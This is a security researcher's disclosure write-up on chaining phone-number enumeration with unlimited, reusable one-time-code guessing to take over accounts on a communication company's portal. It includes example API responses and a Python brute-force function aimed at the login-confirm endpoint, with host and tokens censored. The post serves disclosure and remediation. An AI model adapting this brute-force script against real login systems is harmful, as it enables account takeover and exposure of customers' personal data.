---
layout: post
title: "Full Account Takeover via Enumeration & Missing Rate Limiting"
date: 2024-11-04
category: web
tags: [account-takeover, enumeration, rate-limiting, brute-force, cwe]
severity: critical
excerpt: "Two chained flaws on a communication company's customer portal — an observable response discrepancy let anyone enumerate every customer, and a reusable one-time code with no rate limit turned that list into full account takeover."
---

# Communication Company Customer Portal — Full Account Takeover

## tl;dr

Two vulnerabilities in a communication company's customer portal, chained into **full account takeover of any customer account**:

1. **CWE-204: Observable Response Discrepancy** — the API leaks whether a phone number belongs to a customer, enabling enumeration of every customer in the company.
2. **CWE-307: Improper Restriction of Excessive Authentication** — the one-time login code can be reused and brute-forced without limit.

The second finding is presented first, because the exploitation order requires it: enumeration (finding the victim) → brute-force (logging in as them).

## The research

### CWE-204: Observable Response Discrepancy

While testing another endpoint, I noticed the login-confirmation API answered **differently depending on whether the phone number was registered**:

**Unknown / invalid user:**

```json
{'status': {'isError': True, 'code': 422, 'text': 'Invalid data',
  'message': 'Invalid input'},
 'data': {'phone_number': 'לא ניתן להתחבר עם מספר זה'}}
```

**Valid customer:**

```json
{"status":{"isError":false,"code":200,"text":"Ok","message":"Ok"},"data":""}
```

The response shape itself diverges (`isError` flag, HTTP 422 vs 200, distinct error messages). There is no way to be subtle about this: the API's own design makes user enumeration trivial.

**Impact:** given a list of phone numbers, an attacker can map the entire customer base — names, numbers, who's a customer and who isn't. That's a ready-made target list, and for a communication company, phone numbers are the crown jewels of PII.

> **The fix (developer's view):** return an identical response for both cases — same status code, same body shape, same message. Enumerability should be a design decision, not a default.

### CWE-307: Improper Restriction of Excessive Authentication

With a customer's phone number in hand, the login flow sends a one-time security code. Two things were broken:

1. **No rate limiting** — the endpoint accepted unlimited attempts.
2. **Reusable "one-time" code** — the same CSRF/security token was accepted across the entire attack, so the code became a single reusable credential for brute-forcing every account.

The brute-force script:

```python
async def try_pin_code(phone_number, pin_code, session):
    company_url = "https://<company-domain>/index.php?option=<censored>&task=user.loginConfirm&format=raw"
    cookies = {
        'ea665a87302479a2702d938bca74ec90': '<CSRF_TOKEN_USED_MULTIPLE_TIMES>',
    }

    data = {
        'verification_code': pin_code,
        '<company>SecurityToken': '<censored>',
        'googleAnalyticsClientId': 'false'
    }

    async with session.post(company_url, cookies=cookies, data=data) as resp:
        try:
            json_response = await resp.json()
        except aiohttp.client_exceptions.ContentTypeError:
            text = await resp.text()
            try:
                json_response = json.loads(text)
            except json.decoder.JSONDecodeError:
                print('FAILED', text)
                return

    print(phone_number, pin_code, json_response)
    if not json_response.get('status').get('isError'):
        print('MATCH')
        exit(0)
```

Chaining the enumeration list with this brute-force primitive, I was able to log in to **any** company customer account.

### Impact summary

| Asset | Exposure |
|-------|----------|
| Customer phone numbers | Full enumeration |
| Customer accounts | Full takeover via code brute-force |
| One-time codes | Effectively static (reusable token) |

For a communication company, this is as close to a worst-case portal bug as it gets: it converts a phone-number list into persistent access to every customer's account.

## Fixing it

1. **Response uniformity (CWE-204)** — identical responses for valid and invalid users; consider generic error messages across the whole API.
2. **Rate limiting (CWE-307)** — lock the login endpoint per phone number / per IP with exponential backoff.
3. **Single-use tokens** — a verification code and its CSRF token must be consumed after one success *or* failure; generate a fresh token per attempt.
4. **Account lockout / monitoring** — alert on burst patterns (many codes against one number).

## Disclosure timeline

Reported to the company's incident response channels:

```
תודה על פנייתך, הנושא הועבר לגורמים הרלוונטיים.
```

("Thank you for your report, the matter has been forwarded to the relevant parties.")

## Key takeaways

1. **Enumeration and brute-force are a lethal pair** — one feeds the other.
2. **"One-time" codes are meaningless if the underlying token survives the session.**
3. **Rate limiting is an authentication control, not a performance nicety.**
